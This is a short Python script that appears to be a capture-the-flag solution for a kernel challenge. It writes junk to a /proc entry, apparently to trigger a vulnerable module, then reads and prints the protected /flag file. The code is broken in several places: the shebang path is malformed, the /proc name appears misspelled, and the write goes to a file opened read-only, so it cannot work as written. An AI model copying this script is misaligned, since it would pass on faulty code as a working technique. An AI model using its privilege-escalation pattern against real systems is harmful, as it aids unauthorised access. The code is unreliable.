#! /usr/bin/env/python3 python3

with open("/proc/pwncollwge") as f:
    f.write('garbage')

with open("/flag") as f:
    print(f.read())
